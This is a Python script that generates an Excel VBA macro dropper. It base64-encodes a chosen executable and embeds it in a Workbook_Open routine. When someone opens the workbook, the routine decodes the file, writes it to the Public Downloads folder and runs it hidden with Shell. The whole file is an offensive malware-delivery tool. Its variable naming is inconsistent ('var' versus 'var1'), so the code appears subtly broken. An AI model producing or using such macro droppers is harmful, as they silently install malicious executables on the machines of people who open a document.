#!/bin/python

import os, sys
import argparse

#if len(sys.args) < 2:
#	print ""


#command line args
parser = argparse.ArgumentParser(description='Generates the macro payload to drop an encoded executable to disk.')
parser.add_argument('--exe', dest='exe_name', action='store', default='test.exe')
parser.add_argument('--out', dest='vb_name', action='store', default='test.vb')
parser.add_argument('--dest', dest='dest', action='store', default='C:\\Users\\Public\\Downloads\\test.exe')
#parser.add_argument('--exe', dest='exe_name', action='store', default='test.exe')

args=parser.parse_args()

#OPEN THE FILE
if os.path.isfile(args.exe_name): todo = open(args.exe_name, 'rb').read()
else: sys.exit(0)

def formStr(varstr, instr):
 holder = []
 str1 = ''
 str2 = ''
 str1 = '\t' + varstr + ' = "' + instr[:54] + '"' 
 for i in xrange(54, len(instr), 48):
 	holder.append('\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
 	str2 = '"\r\n'.join(holder)
 
 str2 = str2 + "\""
 str1 = str1 + "\r\n"+str2
 return str1


#ENCODE THE FILE
print "[+] Encoding %d bytes" % (len(todo), )
b64 = todo.encode("base64")
print "[+] Encoded data is %d bytes" % (len(b64), )

b64 = b64.replace("\n","")

str = formStr("var",b64)
#i = 0
#str = 'Dim var1\n'
#for line in b64:
#	line = line.strip("\n")
#	if i > 0:	
#		str = str + "var1 = var1 & \"" + line + "\"\n"
#	else:
#		str = str +"var1 = \""+ line+"\"\n"	
#	i=1
#vb_in.close()
#f = open("base64_output.vb", "w")
#f.write(str)
#f.close()
#print "[+] VB file completed!"

top = "Option Explicit\r\n\r\nConst TypeBinary = 1\r\nConst ForReading = 1, ForWriting = 2, ForAppending = 8\r\n"

next = "Private Function decodeBase64(base64)\r\n\tDim DM, EL\r\n\tSet DM = CreateObject(\"Microsoft.XMLDOM\")\r\n\t' Create temporary node with Base64 data type\r\n\tSet EL = DM.createElement(\"tmp\")\r\n\tEL.DataType = \"bin.base64\"\r\n\t' Set encoded String, get bytes\r\n\tEL.Text = base64\r\n\tdecodeBase64 = EL.NodeTypedValue\r\nEnd Function\r\n"

then1 = "Private Sub writeBytes(file, bytes)\r\n\tDim binaryStream\r\n\tSet binaryStream = CreateObject(\"ADODB.Stream\")\r\n\tbinaryStream.Type = TypeBinary\r\n\t'Open the stream and write binary data\r\n\tbinaryStream.Open\r\n\tbinaryStream.Write bytes\r\n\t'Save binary data to disk\r\n\tbinaryStream.SaveToFile file, ForWriting\r\nEnd Sub\r\n"

sub_open = "Private Sub Workbook_Open()\r\n"

sub_open = sub_open + str

sub_open = sub_open + "\r\n\r\n\tDim decode\r\n\tdecode = decodeBase64(var1)\r\n\tDim outFile\r\n\toutFile = \""+args.dest+"\"\r\n\tCall writeBytes(outFile, decode)\r\n\r\n\tDim retVal\r\n\tretVal = Shell(outFile, 0)\r\nEnd Sub"

vb_file = top + next + then1 + sub_open

print "[+] Writing to "+args.vb_name
f = open(args.vb_name, "w")
f.write(vb_file)
f.close()

